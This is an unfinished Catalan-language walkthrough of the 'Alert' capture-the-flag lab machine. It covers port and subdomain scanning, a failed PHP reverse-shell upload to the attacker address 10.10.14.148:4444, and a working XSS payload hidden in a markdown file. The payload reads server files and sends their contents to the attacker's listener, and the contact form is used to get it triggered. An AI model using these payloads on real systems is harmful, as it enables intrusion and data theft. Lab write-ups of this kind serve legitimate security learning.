Anirem directament al reconeixement actiu per fer-ne via, fent un nmap directament i saltant-nos el reconeixement passiu:
```
┌──(polkali㉿kaliPol)-[~]
└─$ nmap -sC -sV -v 10.10.11.44
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 09:21 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:21
Completed NSE at 09:21, 0.00s elapsed
Initiating NSE at 09:21
Completed NSE at 09:21, 0.00s elapsed
Initiating NSE at 09:21
Completed NSE at 09:21, 0.00s elapsed
Initiating Ping Scan at 09:21
Scanning 10.10.11.44 [4 ports]
Completed Ping Scan at 09:21, 2.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:21
Completed Parallel DNS resolution of 1 host. at 09:21, 0.06s elapsed
Initiating SYN Stealth Scan at 09:21
Scanning 10.10.11.44 [1000 ports]
Discovered open port 80/tcp on 10.10.11.44
Discovered open port 22/tcp on 10.10.11.44
Completed SYN Stealth Scan at 09:21, 3.37s elapsed (1000 total ports)
Initiating Service scan at 09:21
Scanning 2 services on 10.10.11.44
Completed Service scan at 09:21, 6.11s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.44.
Initiating NSE at 09:21
Completed NSE at 09:21, 1.43s elapsed
Initiating NSE at 09:21
Completed NSE at 09:21, 0.18s elapsed
Initiating NSE at 09:21
Completed NSE at 09:21, 0.00s elapsed
Nmap scan report for 10.10.11.44
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://alert.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 09:21
Completed NSE at 09:21, 0.00s elapsed
Initiating NSE at 09:21
Completed NSE at 09:21, 0.00s elapsed
Initiating NSE at 09:21
Completed NSE at 09:21, 0.01s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.00 seconds
           Raw packets sent: 1171 (51.476KB) | Rcvd: 1002 (40.088KB)
                                                                             
```

Trobem dos ports oberts, accés a una web per el port 80 per http i a la que tinguem unes credencials ens podrem connectar per SSH ja que també té el port 22 obert. 

Abans de anar al port 80 per el navegador, farem un curl i un whatweb per veure que hi ha. Ho fem directe a la IP ja que encara no tenim el domini, i així potser el podem treure.

El curl ens indica que la pàgina web s'ha mogut de lloc i ens retorna un 301 de redirecció, però veiem també el nom del domini cosa que ens servirà per afegir-lo a l'`/etc/hosts`: 

```
curl http://10.10.11.44
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://alert.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.10.11.44 Port 80</address>
</body></html>
```

Ara fem el whatweb:

```
┌──(polkali㉿kaliPol)-[~]
└─$ whatweb http://10.10.11.44
http://10.10.11.44 [301 Moved Permanently] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.44], RedirectLocation[http://alert.htb/], Title[301 Moved Permanently]
ERROR Opening: http://alert.htb/ - no address for alert.htb

```

Veiem que ens redirecciona a alert.htb, per tant ara l'afegirem al nostre fitxer `/etc/hosts` i veiem també, interessant, la versió del servidor apache que on corre la pàgina web.
```
sudo nano /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali
10.10.11.38     chemistry.htb
10.10.11.32     sightless.htb
127.0.0.1       sightless.htb
10.10.11.44     alert.htb
```

Ara, amb el domini, tornarem a fer el curl i el whatweb:

Amb el curl veiem l'html de la pàgina web:
```
curl http://alert.htb  
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Alert - Markdown Viewer</title>
</head>
<body>
    <nav>
        <a href="index.php?page=alert">Markdown Viewer</a>
        <a href="index.php?page=contact">Contact Us</a>
        <a href="index.php?page=about">About Us</a>
        <a href="index.php?page=donate">Donate</a>
            </nav>
    <div class="container">
            </div>
    <footer>
        <p style="color: black;">© 2024 Alert. All rights reserved.</p>
    </footer>
</body>
</html>
```

I amb el whatweb a veure si podem treure alguna informació extra:
```
whatweb http://alert.htb
http://alert.htb [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.44], RedirectLocation[index.php?page=alert], Title[Alert - Markdown Viewer]
http://alert.htb/index.php?page=alert [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.44], Title[Alert - Markdown Viewer]
```

Veiem que ens redirigeix a un index.php, interessant, segurament hi haurà un formulari per on haurem d'intentar accedir amb XSS o SQL Injection o amb alguna vulnerabilitat d'algun software que no ens apareix amb el whatweb.

Pel que veiem a la pàgina, és una eina/programa web per visualitzar fitxers markdown (.md). Per veure si està limitat correctament la càrrega de fitxers .md provem de pujar una imatge a veure si podem:

![image](https://github.com/user-attachments/assets/3925704c-3e31-4f1e-9615-26d145bd3bc8)

Aconseguim pujarla, però ens surt l'error següent:

![image](https://github.com/user-attachments/assets/5aafac9e-d78c-458a-846f-8a31e41df553)


```
Error: File must be a Markdown file (.md). 
```

Per tant, ara, el següent pas que farem serà pujar un fitxer .md a veure si el podem visualitzar correctament amb aquesta eina.

![image](https://github.com/user-attachments/assets/8012d237-ed28-48d6-9c8c-bf3da0421ac0)


I sí, l'aplicació web funciona i ens permet veure el fitxer markdown que acabem de pujar:

![image](https://github.com/user-attachments/assets/dab1d4bd-1654-4b51-a6db-73770aac162b)


Curíos que a baix a la dreta hi ha un botó que posa "Share markdown". Si hi cliquem ens obre la visualització del markdown en una altra pestanya.


![image](https://github.com/user-attachments/assets/df65cef0-4241-41d1-baef-757f6be29496)


Pel que veiem, sembla que haurem de pujar un fitxer markdown amb alguna reverse shell en php.

Ara, provarem de pujar una reverse shell amb de PHP amb el format .md a veure si funciona (no crec que sigui tant senzill). He agafat la reverse shell de https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php . Tal i com indica l'script, simplement hem canviat aquesta part:
```
$ip = '10.10.14.148';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
```
Mentre a la nostra màquina obrim el port per escoltar:
```
┌──(kali㉿kali)-[~/Documents/Alert]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
```

Ara cliquem a View Markdown, i no veiem res, no es visualitza l'script php però tampoc funciona la reverse shell.

Com que no me'n surto amb això, passaré a fer una escaneig de subdominis i de dominis. Amb l'escaneig de subdominis fet amb fuff i amb el fitxer de subdominis més gros que tinc a la màquina kali he trobat el subdomini ``statistics`` i l'he afegit al fitxer /etc/hosts/


````
┌──(kali㉿kali)-[/usr/share/wordlists/amass]
└─$ ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u http://alert.htb -H "Host:FUZZ.alert.htb" -ac 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://alert.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/amass/subdomains-top1mil-110000.txt
 :: Header           : Host: FUZZ.alert.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

statistics              [Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 46ms]
:: Progress: [114606/114606] :: Job [1/1] :: 1047 req/sec :: Duration: [0:01:57] :: Errors: 0 ::
````

Si intentem anar al subdomini statistics.alert.htb que ara tenim al fitxer /etc/hosts, ens demana nom i passwd d'usuari, cosa que de moment no tenim, ara, sabem que l'haurem d'aconseguir.

![image](https://github.com/user-attachments/assets/58dab06b-493e-4f0c-b1ba-7317a091cdf3)

Per curiositat, fem un whatweb, però veiem que ens retorn un 401 que no estem autoritzats a accedir-hi i veiem que hi ha un WWW-Authenticate que és el que em vist que ens demana les credencials:

````
┌──(kali㉿kali)-[~]
└─$ whatweb http://statistics.alert.htb
http://statistics.alert.htb [401 Unauthorized] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.44], Title[401 Unauthorized], WWW-Authenticate[Restricted Area][Basic]
````

Al fer un curl ens passa el que era previsible, al no estar autoritzats a accedir a aquesta pàgina web, a aquest subdomini, no podem veure el codi font, l'html:

````
┌──(kali㉿kali)-[~]
└─$ curl http://statistics.alert.htb
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at statistics.alert.htb Port 80</address>
</body></html>
````

També hem fet un escaneig de dominis amb gobuster i ehm trobat 3 dominis:

````
──(kali㉿kali)-[~]
└─$ gobuster dir --url http://alert.htb / --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://alert.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 308] [--> http://alert.htb/uploads/]
/css                  (Status: 301) [Size: 304] [--> http://alert.htb/css/]
/messages             (Status: 301) [Size: 309] [--> http://alert.htb/messages/]
Progress: 141708 / 141709 (100.00%)
===============================================================
Finished
===============================================================
````

A /uploads/ no hi podem accedir:

![image](https://github.com/user-attachments/assets/8ea7ea18-2e8f-4933-9085-2a40c720c2d0)

i a /messages/ tampoc:

![image](https://github.com/user-attachments/assets/d79ddf62-ca2e-4d30-9197-b798968b5108)


Després de provar vàris reverse shell en vàris llenguatges de programació diferents, bash, php, python, i escanejar dominis i subdomnis, provarem a fer XSS. He trobat un payload per fer-ho, que combina XSS (Cross-Site Scripting) i SSRF (Server-Side Request Forgery). El payload que posem al fitxer markwodn és el següent:

```
<script>
fetch("http://alert.htb/messages.php?file=filepath")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.14.148:4444/?file_content=" + encodeURIComponent(data));
  });
</script>
```

Al pujar aquest payload en un fitxer markdown, funciona:

```
┌──(kali㉿kali)-[~/Documents/Alert]
└─$ nc -nlvp 4444              
listening on [any] 4444 ...
connect to [10.10.14.148] from (UNKNOWN) [10.10.14.148] 43340
GET /?file_content=%0A HTTP/1.1
Host: 10.10.14.148:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://alert.htb/
Origin: http://alert.htb
Connection: keep-alive
Priority: u=4
```

Tot i així, aconsegueixo resposta però aconsegueixo només un "%0a" que és símbol d'una nova línia en URL.

Okey, després de molt de temps i moltes proves, he entès com funciona. He canviat la forma d'escoltar o rebre el que rebo a la màquina del servidor gràcies al payload i he passat a utilitzar un servidor http fet amb python: `python3 -m http.server 4444` ja que he vist que és millor per:

Quan necessites processar sol·licituds HTTP.
Quan vols servir fitxers o preparar respostes personalitzades.
Quan vols més informació sobre les sol·licituds rebudes.
Quan treballes amb dades codificades o estructurades.

Llavors, el procés ha passat a ser el següent: Nosaltres carreguem el payload en Javascript dins d'un fitxer .md i el pujem aquí (obviem el nom del fitxer .md ja que l'he reutilitzat):

![image](https://github.com/user-attachments/assets/cde0a411-26c5-43dc-b214-a1f39355f4ed)

UN cop carregat, cliquem a View Markdown, i ens portarà a una pàgina on quan carreguem un fitxer markdown de veritat el podem visualitzar com hem vist abans. Com que no és el cas no veurem res:

![image](https://github.com/user-attachments/assets/8bdbf4c6-dcf7-47fe-a009-124cb60928a9)

Aquí, la clau es troba en anar sobre Share Markdown i el hover ens mostrarà la URL: 

![image](https://github.com/user-attachments/assets/5ecb225c-1e55-47df-9348-0899935d4f4b)

El que hem de fer és copiar aquest link amb el botó dret, o bé podriem clicar a Share Markdown, on la interfície de l'aplicació ens mostrarà un error però tindrem la url a dalt

![image](https://github.com/user-attachments/assets/f804cdf9-5a42-4a2f-8638-02079c1c3f31)

Un cop tenim la URL, anem al formulari de contacte -> Contact Us, i allà enganxem la url al missate:

![image](https://github.com/user-attachments/assets/c939e119-daf7-4ffb-a712-460c4b774ec3)

Cliquem a Send, i veiem un missatge que diu que el missatge s'ha enviat amb èxit:

![image](https://github.com/user-attachments/assets/a90abc07-6e23-40f4-a162-ee239d8ec521)


Ara, si anem al servidor http que havíem obert per veure les peticions i respostes que fem nosaltres, veiem que ja tenim una resposta:
```
┌──(kali㉿kali)-[~/Documents/Alert]
└─$ python3 -m http.server 4444

Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.10.14.192 - - [06/Dec/2024 09:52:04] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.11.44 - - [06/Dec/2024 09:52:58] "GET /?file_content=%3Cpre%3E%3C%2Fpre%3E%0A HTTP/1.1" 200 -
```

Amb un string que hem de desxifrar amb URL encode, per exemple: https://www.urldecoder.org/es/

Ara mateix estic aquí en aquesta fase, i em tocarà fer vàries proves de quins fitxers puc llegir/obtenir el seu contingut amb aquest mètode, però almenys ja estem obtenint una resposta i la podem llegir amb l'URL decoder.

